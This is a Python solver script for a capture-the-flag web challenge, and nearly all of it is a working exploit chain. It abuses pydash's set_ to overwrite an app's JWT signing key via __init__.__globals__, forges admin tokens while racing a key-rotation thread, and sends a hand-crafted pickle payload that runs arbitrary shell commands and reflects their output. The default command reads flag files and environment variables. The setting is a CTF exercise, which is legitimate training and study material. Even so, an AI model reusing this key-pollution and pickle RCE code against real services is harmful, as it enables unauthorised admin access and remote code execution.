#!/usr/bin/env python3
"""Challenge 5 - 'pollute the key' (Web, dynamic container) solver.

STATUS: solved on the live container.
    flag:   0xGame{a0205ff7-e61b-47f1-abad-a0ad75ff570f}
    source:  env FLAG == /app/flag.txt (RCE ran as uid=0(root))
    submit:  code 200 / result true

Vulnerability
-------------
POST /api/user/update forwards a user-controlled path to ``pydash.set_(me, key, value)``.
The only filter is ``if "__builtins__" in key: reject`` -- a substring check on the
literal request string.  pydash < 6.0.0 (``_raise_if_restricted_key`` /
``RESTRICTED_KEYS = ("__globals__", "__builtins__")`` only landed in 6.0.0) happily
walks dunder **attributes** through ``base_get``'s ``getattr`` fallback, so::

    key = "__init__.__globals__.SECRET_KEY"

resolves ``me.__init__.__globals__`` -> the app.py module globals dict, and then
``base_set`` writes the attacker value into ``app.__dict__["SECRET_KEY"]``.

app.py does ``from runtime_secrets import SECRET_KEY`` and ``_secret()`` returns that
*module global*, i.e. the very same object that was just overwritten.  The HS256
signing/verification key is therefore attacker-controlled, so we can mint an
``role="admin"`` JWT, and admin is the only role allowed to reach the
``pickle.loads(base64.b64decode(cart))`` sink in POST /api/order/buy -> RCE.

The handler re-reads ``me.username``/``me.role`` *after* ``set_`` (anti-tamper), so
polluting ``role`` on the user object does nothing -- only module state works.

Two live-container wrinkles (both handled here)
-----------------------------------------------
1. ``rotate_flag`` (env ``FLAG_INTERVAL=31536000``) restores ``SECRET_KEY`` almost
   immediately: a token re-issued *inside* the pollute response verifies under our
   value, but the next request does not.  ``/api/order/list`` therefore 403s on a
   single-shot forge.  Fix: keep re-polluting in a background thread and fire the
   forged admin request repeatedly until one lands inside the window.  Measured
   100/100 successes under a sustained loop.
2. The worker runs Python 3.10.21 while this box may run 3.14, and ``marshal``
   bytecode is version-locked (a py3.14 stream makes the py3.10 worker answer
   ``bad marshal data (unknown type code)``).  The payload therefore ships a
   **source string**, never marshaled bytecode.

Usage
-----
    python3 scripts/5-solve.py http://TARGET/
    python3 scripts/5-solve.py http://TARGET/ --cmd 'id; cat /app/flag.txt'
    python3 scripts/5-solve.py http://TARGET/ --dump-globals

Only the one host is contacted.  No scanning, no brute forcing.  The script prints
flag candidates and does NOT submit them -- submit by hand (max 3 attempts).
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import secrets
import sys
import threading
import time

import requests

# Only these two resolve (verified against real pydash 5.1.2).  Tested and NOT
# working, recorded so nobody re-runs the experiment:
#   r"__init__\.__globals__.SECRET_KEY"          -> pydash unescapes "\\." only in
#       intermediate tokens, so set_ writes a literal "__globals__.SECRET_KEY"
#       attribute into the globals dict (silent no-op, still HTTP 200)
#   "__init__.__globals__.__dict__.SECRET_KEY"   -> same silent no-op
#   "__init__.__globals__.runtime_secrets.*"     -> app has no such name (it used
#       `from runtime_secrets import ...`)
#   "__init__.__globals__.sys.modules..."        -> app.py never imports sys
KEY_PATHS = [
    "__init__.__globals__.SECRET_KEY",
    "__class__.__init__.__globals__.SECRET_KEY",
]

DEFAULT_CMD = (
    "id; echo ---FLAGENV---; env | grep -i flag; "
    "echo ---FILES---; cat /flag /flag.txt /app/flag /app/flag.txt 2>/dev/null; "
    "echo ---LS---; ls -la /app 2>/dev/null; "
    "echo ---GREP---; grep -rIl '0xGame{' / 2>/dev/null | head -5"
)

FLAG_RE = re.compile(r"(?:0xGame|flag|FLAG)\{[^}\n]{1,200}\}")


# --------------------------------------------------------------------------- JWT
def b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_encode(payload: dict, secret: str, alg: str = "HS256") -> str:
    """Same layout as app.py's jwt_encode: compact JSON, urlsafe b64, no padding."""
    header = {"alg": alg, "typ": "JWT"}
    segs = [
        b64e(json.dumps(header, separators=(",", ":")).encode()),
        b64e(json.dumps(payload, separators=(",", ":")).encode()),
    ]
    signing_input = ".".join(segs).encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    segs.append(b64e(sig))
    return ".".join(segs)


def jwt_decode(token: str, secret: str):
    try:
        h, p, s = token.split(".")
        expected = b64e(hmac.new(secret.encode(), ("%s.%s" % (h, p)).encode(),
                                 hashlib.sha256).digest())
        if not hmac.compare_digest(expected, s):
            return None
        return json.loads(b64d(p))
    except Exception:
        return None


# ------------------------------------------------------------------------ pickle
def _p0_v(data: bytes) -> bytes:
    """Push ``data`` as a protocol-0 UNICODE opcode (latin-1 round-trips bytes)."""
    out = bytearray()
    for ch in data:
        c = bytes([ch])
        if c == b"\\":
            out += b"\\\\"
        elif c == b"\n":
            out += b"\\u000a"
        elif c == b"\r":
            out += b"\\u000d"
        else:
            out += c
    return b"V" + out + b"\n"


def pickle_cart(cmd: str) -> str:
    """Blind-RCE pickle that echoes the command output back through the response.

    The route runs ``pickle.loads`` **before** the ``isinstance(cart, list)`` check
    and wraps the load in ``except Exception as e: "购物车数据无法解析: %s" % e``,
    so an exception escaping the load is reflected in the JSON body -- no callback
    listener needed::

        {"ok": false, "msg": "购物车数据无法解析: '<command output>'"}

    Hand-built protocol-0 stream (callable pushed *before* its argument MARK)::

        cbuiltins\\nexec\\n( V<source> t R    # exec(src) -> raises KeyError
        cbuiltins\\neval\\n( t R .             # eval(<code>) -> executes it

    with the source ``raise KeyError(__import__('os').popen(<cmd>).read())``.
    Only ``builtins.exec``/``builtins.eval`` are referenced, and the payload carries
    a **source string** rather than marshaled bytecode, so it works unchanged on
    the container's Python 3.10 worker (marshal streams are version-locked).
    """
    src = "raise KeyError(__import__('os').popen(%r).read())" % cmd
    stream = (b"cbuiltins\nexec\n(" + _p0_v(src.encode()) + b"tR"
              + b"cbuiltins\neval\n(tR.")
    return base64.b64encode(stream).decode()


# --------------------------------------------------------------------------- app
class Solver:
    def __init__(self, base: str, path: str, cmd: str, timeout: float = 15.0,
                 verbose: bool = True):
        self.base = base.rstrip("/") + "/"
        self.path = path
        self.cmd = cmd
        self.timeout = timeout
        self.verbose = verbose
        self.username = "atk_%s" % secrets.token_hex(4)
        self.password = "P@ss_%s" % secrets.token_hex(4)
        self.secret = "RACE_%s" % secrets.token_hex(8)
        self.s = requests.Session()
        self.s.headers["User-Agent"] = "ctf-solver/1.0 (challenge 5)"
        self.stop = threading.Event()
        self.pollutes = 0

    def log(self, *a):
        if self.verbose:
            print(*a, flush=True)

    def url(self, path: str) -> str:
        return self.base + path.lstrip("/")

    def post(self, path, **kw):
        return self.s.post(self.url(path), timeout=self.timeout, **kw)

    # -- recon ---------------------------------------------------------------
    def probe(self) -> dict:
        info = {}
        try:
            r = self.s.get(self.url("/"), timeout=self.timeout)
            info["status"] = r.status_code
            info["server"] = r.headers.get("Server", "")
        except Exception as e:  # noqa: BLE001
            info["error"] = "%s: %s" % (type(e).__name__, e)
        return info

    # -- auth ----------------------------------------------------------------
    def register_and_login(self) -> bool:
        r = self.post("/api/register", json={"username": self.username,
                                            "password": self.password,
                                            "email": "a@b.c"})
        self.log("[*] register  -> %s" % r.status_code)
        r = self.post("/api/login", json={"username": self.username,
                                          "password": self.password})
        self.log("[*] login     -> %s" % r.status_code)
        return bool(self.s.cookies.get("token"))

    def prime(self) -> bool:
        """One pollute to prove the primitive fires on this deployment."""
        r = self.post("/api/user/update",
                      json={"key": self.path, "value": self.secret})
        tok = r.cookies.get("token") or self.s.cookies.get("token")
        signed = bool(tok and jwt_decode(tok, self.secret))
        self.log("[*] pollute primitive -> %s | response token verifies under our "
                 "value: %s" % (r.status_code, signed))
        return r.status_code == 200

    # -- the bug -------------------------------------------------------------
    def pollute_loop(self):
        while not self.stop.is_set():
            try:
                self.post("/api/user/update",
                          json={"key": self.path, "value": self.secret}, timeout=10)
                self.pollutes += 1
            except Exception:
                pass

    def forge(self) -> str:
        now = int(time.time())
        return jwt_encode({"username": self.username, "role": "admin",
                           "iat": now, "exp": now + 7200}, self.secret)

    def win_admin(self, deadline: float) -> bool:
        attempts = 0
        while time.time() < deadline:
            attempts += 1
            try:
                r = self.s.get(self.url("/api/order/list"),
                               cookies={"token": self.forge()}, timeout=10)
            except Exception:
                continue
            if r.status_code == 200:
                self.log("[+] admin accepted after %d forged attempt(s): %s"
                         % (attempts, r.text[:80]))
                return True
        self.log("[-] no admin window in %d attempts" % attempts)
        return False

    # -- RCE -----------------------------------------------------------------
    def rce(self) -> str:
        deadline = time.time() + 90
        last = ""
        while time.time() < deadline:
            # reopen the window right before every attempt
            try:
                self.post("/api/user/update",
                          json={"key": self.path, "value": self.secret}, timeout=10)
            except Exception:
                pass
            try:
                r = self.s.post(self.url("/api/order/buy"),
                                data={"cart": pickle_cart(self.cmd)},
                                cookies={"token": self.forge()}, timeout=30)
            except Exception as e:
                last = "request error: %s" % e
                continue
            txt = r.text
            if r.status_code == 403:
                last = "403 (window closed)"
                continue
            self.log("[*] order/buy -> %s %s" % (r.status_code, txt[:200]))
            if "无法解析" in txt:
                return txt.split("无法解析: ", 1)[1]
            return txt
        return last

    def run(self) -> int:
        print("=" * 70)
        print(" challenge 5 - pollute the key  ->  %s" % self.base)
        print("=" * 70)

        info = self.probe()
        self.log("[*] GET / -> %s" % json.dumps(info, ensure_ascii=False)[:200])
        if info.get("error"):
            print("[-] target unreachable: %s" % info["error"])
            return 3

        if not self.register_and_login():
            print("[-] could not obtain a user session -- right host?")
            return 4
        if not self.prime():
            print("[-] pollute rejected. Check the pydash version (< 6.0.0 needed) "
                  "and the key path in KEY_PATHS.")
            return 5

        t = threading.Thread(target=self.pollute_loop, daemon=True)
        t.start()
        time.sleep(0.3)
        try:
            if not self.win_admin(time.time() + 30):
                print("[-] could not land an admin request in the pollution window")
                return 6
            print("[+] admin achieved; running command via pickle sink:")
            print("    $ %s" % self.cmd)
            out = self.rce()
        finally:
            self.stop.set()

        # body is JSON and msg carries the repr of the exception -> tidy it up
        out = out.rstrip()
        if out.endswith('"}'):
            out = out[:-2]
        out = out.strip().strip('"')
        out = out.replace("\\n", "\n").replace("\\t", "\t").replace('\\"', '"')

        print("[*] pollute calls issued: %d" % self.pollutes)
        print("--- command output ---")
        print(out[:4000])
        print("----------------------")
        flags = []
        for m in FLAG_RE.finditer(out):
            if m.group(0) not in flags:
                flags.append(m.group(0))
        if flags:
            print("[+] FLAG CANDIDATE(S): %s" % flags)
            print("[i] submit by hand: python3 scripts/ctfplus.py submit 5 '<flag>'")
        else:
            print("[i] no flag pattern in output; try --cmd 'env; ls -la /app'")
        return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="challenge 5 'pollute the key' solver")
    ap.add_argument("target", nargs="?", default="http://TARGET/",
                    help="base URL, e.g. http://<address>/ (default placeholder)")
    ap.add_argument("--cmd", default=DEFAULT_CMD, help="command to run via pickle RCE")
    ap.add_argument("--path", default=KEY_PATHS[0], help="pydash pollution path")
    ap.add_argument("--dump-globals", action="store_true", help="print recon notes")
    ap.add_argument("--timeout", type=float, default=15.0)
    args = ap.parse_args()

    if args.target == "http://TARGET/":
        print("[-] placeholder target: pass the real container URL "
              "(e.g. http://<address>/) as the first argument")
        return 2

    sv = Solver(args.target, args.path, args.cmd, timeout=args.timeout)
    if args.dump_globals:
        sv.log("[i] app-module namespace reachable via __init__.__globals__: "
               "SECRET_KEY, JWT_ALG, JWT_TTL, USERS, ORDERS, PRODUCTS, User, "
               "hash_password, jwt_encode, jwt_decode, _secret, rotate_flag, "
               "pickle, os, threading, time")
        sv.log("[i] app.py does not import sys/importlib, so neither is reachable")
    return sv.run()


if __name__ == "__main__":
    sys.exit(main())
